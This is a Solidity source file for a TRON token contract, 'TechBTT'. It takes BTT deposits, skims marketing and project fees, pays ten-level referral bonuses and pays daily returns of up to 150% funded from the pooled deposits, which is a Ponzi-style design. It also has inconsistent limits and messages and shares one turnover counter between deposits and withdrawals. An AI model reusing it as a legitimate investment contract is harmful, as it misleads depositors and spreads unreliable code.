//SourceUnit: TechBTT.sol

pragma solidity 0.5.10;

contract TechBTT {
    using SafeMath for uint;
    uint256 tokenId = 1002000;
    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 2000 trx;
    uint constant public INVEST_MAX_AMOUNT = 2500 trx;
    uint constant public WITHDRAW_MIN_AMOUNT = 1 trx;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [400, 200, 100, 50, 50, 50, 50, 50, 50, 50];
    uint constant public MARKETING_FEE = 500;
    uint constant public PROJECT_FEE = 500;
    uint constant public MAX_CONTRACT_PERCENT = 300;
    uint constant public MAX_HOLD_PERCENT = 400;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 10000000 trx;
    uint constant public TIME_STEP = 1 days;
    uint constant public INVEST_MAX_AMOUNT_STEP = 4500000 trx;
    uint[] public DAY_LIMIT_WITHDRAW = [1000000 trx, 1000000 trx];
    uint[] public DAY_LIMIT_STEPS = [2500000 trx, 5000000 trx, 12500000 trx, 25000000 trx, 50000000 trx];

    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreation;

    address payable public marketingAddress;
    address payable public projectAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint64 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint24[10] refs;
        uint16 rbackPercent;
        uint lastinvest;
    }

    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable marketingAddr, address payable projectAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        contractCreation = block.timestamp;
        contractPercent = getContractBalanceRate();
    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        User storage user = users[msg.sender];
        
        require (block.timestamp > user.lastinvest.add(TIME_STEP), "Try Again in 24hours");
        
        uint InvestLimit = getCurrentInvestLimit();
        require(msg.tokenid == tokenId,"JUST BTT");

        require(msg.tokenvalue >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 BTT");
        require(msg.tokenvalue <= InvestLimit, "Maximum deposit amount exceded");

        
        

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

        uint availableLimit = getCurrentHalfDayAvailable();
        require(availableLimit > 0, "Deposit limit exceed");

        uint msgValue = msg.tokenvalue;

        if (msgValue > availableLimit) {
            msg.sender.transferToken(msgValue.sub(availableLimit), tokenId);
            msgValue = availableLimit;
        }

        uint halfDayTurnover = turnover[getCurrentHalfDay()];
        uint halfDayLimit = getCurrentDayLimit();

        if (INVEST_MIN_AMOUNT.add(msgValue).add(halfDayTurnover) < halfDayLimit) {
            turnover[getCurrentHalfDay()] = halfDayTurnover.add(msgValue);
        } else {
            turnover[getCurrentHalfDay()] = halfDayLimit;
        }

        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        marketingAddress.transferToken(marketingFee, tokenId);
        projectAddress.transferToken(projectFee, tokenId);

        emit FeePayed(msg.sender, marketingFee.add(projectFee));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 10; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    if (i == 0 && users[upline].rbackPercent > 0) {
                        refbackAmount = amount.mul(uint(users[upline].rbackPercent)).div(PERCENTS_DIVIDER);
                        msg.sender.transferToken(refbackAmount, tokenId);

                        emit RefBack(upline, msg.sender, refbackAmount);

                        amount = amount.sub(refbackAmount);
                    }

                    if (amount > 0) {
                        address(uint160(upline)).transferToken(amount, tokenId);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));

                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint64(refbackAmount), uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }
       user.lastinvest = block.timestamp;
        emit NewDeposit(msg.sender, msgValue);
    }

    function withdraw() public {
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3).div(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3).div(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(3).div(2)).sub(uint(user.deposits[i].withdrawn));
                }

                //user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
        uint availableLimitWithdraw = getCurrentHalfDayWithdrawAvailable();
        //require(availableLimitWithdraw > 0, "Withdraw limit exceed");

        if (dividends > availableLimitWithdraw) {
            //msg.sender.transferToken(totalAmount.sub(availableLimitWithdraw));
            dividends = availableLimitWithdraw;
        }

        uint halfDayWithdrawTurnover = turnover[getCurrentHalfDayWithdraw()];
        uint halfDayWithdrawLimit = getCurrentDayWithdrawLimit();

        if (WITHDRAW_MIN_AMOUNT.add(dividends).add(halfDayWithdrawTurnover) < halfDayWithdrawLimit) {
            turnover[getCurrentHalfDayWithdraw()] = halfDayWithdrawTurnover.add(dividends);
        } else {
            turnover[getCurrentHalfDayWithdraw()] = halfDayWithdrawLimit;
        }  
        
        user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends));
        totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = address(this).tokenBalance(tokenId);
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
        user.checkpoint = uint32(block.timestamp);
        
        msg.sender.transferToken(totalAmount, tokenId);
        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }

    function setRefback(uint16 rbackPercent) public {
        require(rbackPercent <= 10000);

        User storage user = users[msg.sender];

        if (user.deposits.length > 0) {
            user.rbackPercent = rbackPercent;
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).tokenBalance(tokenId);
    }

    function getContractBalanceRate() internal view returns (uint) {
        uint contractBalance = address(this).tokenBalance(tokenId);
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(5));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

function getUserHoldRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return timeMultiplier;
        }
    }


    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3).div(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3).div(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(3).div(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(3).div(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn)).add(uint(user.deposits[i].refback));
        }

        return amount;
    }

    function getCurrentHalfDay() public view returns (uint) {
        return (block.timestamp.sub(contractCreation)).div(TIME_STEP.div(2));
    }

    function getCurrentDayLimit() public view returns (uint) {
        uint limit;

        uint currentDay = (block.timestamp.sub(contractCreation)).div(TIME_STEP);

        if (currentDay == 0) {
            limit = DAY_LIMIT_STEPS[0];
        } else if (currentDay == 1) {
            limit = DAY_LIMIT_STEPS[1];
        } else if (currentDay >= 2 && currentDay <= 3) {
            limit = DAY_LIMIT_STEPS[1].mul(currentDay);
        } else if (currentDay >= 4 && currentDay <= 9) {
            limit = DAY_LIMIT_STEPS[2].mul(currentDay.sub(1));
        } else if (currentDay >= 10 && currentDay <= 19) {
            limit = DAY_LIMIT_STEPS[3].mul(currentDay.sub(4));
        } else if (currentDay >= 20) {
            limit = DAY_LIMIT_STEPS[4].mul(currentDay.sub(12));
        }

        return limit;
    }

    function getCurrentHalfDayTurnover() public view returns (uint) {
        return turnover[getCurrentHalfDay()];
    }

    function getCurrentHalfDayAvailable() public view returns (uint) {
        return getCurrentDayLimit().sub(getCurrentHalfDayTurnover());
    }
    
    function getCurrentHalfDayWithdraw() public view returns (uint) {
        return (block.timestamp.sub(contractCreation)).div(TIME_STEP.div(2));
    }

    function getCurrentDayWithdrawLimit() public view returns (uint) {
        uint limit;

        uint currentDayWithdraw = (block.timestamp.sub(contractCreation)).div(TIME_STEP);

        if (currentDayWithdraw == 0) {
            limit = DAY_LIMIT_WITHDRAW[0];
        } else if (currentDayWithdraw >= 1) {
            limit = DAY_LIMIT_WITHDRAW[1];
        }

        return limit;
    }


    function getCurrentHalfDayWithdrawTurnover() public view returns (uint) {
        return turnover[getCurrentHalfDayWithdraw()];
    }

    function getCurrentHalfDayWithdrawAvailable() public view returns (uint) {
        return getCurrentDayWithdrawLimit().sub(getCurrentHalfDayWithdrawTurnover());
    }
    
    function getCurrentInvestLimit() public view returns (uint) {
        uint limit;

        if (totalInvested <= INVEST_MAX_AMOUNT_STEP) {
            limit = INVEST_MAX_AMOUNT;
        } else if (totalInvested >= INVEST_MAX_AMOUNT_STEP) {
            limit = totalInvested.div(10);
        }

        return limit;
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, getContractBalance(), contractPercent, getCurrentHalfDayAvailable(),getCurrentHalfDayWithdrawAvailable(),getCurrentInvestLimit());
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);
        uint userholdPerc = getUserHoldRate(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn, userholdPerc);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint64, uint64, uint24[10] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.rbackPercent, users[user.referrer].rbackPercent, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}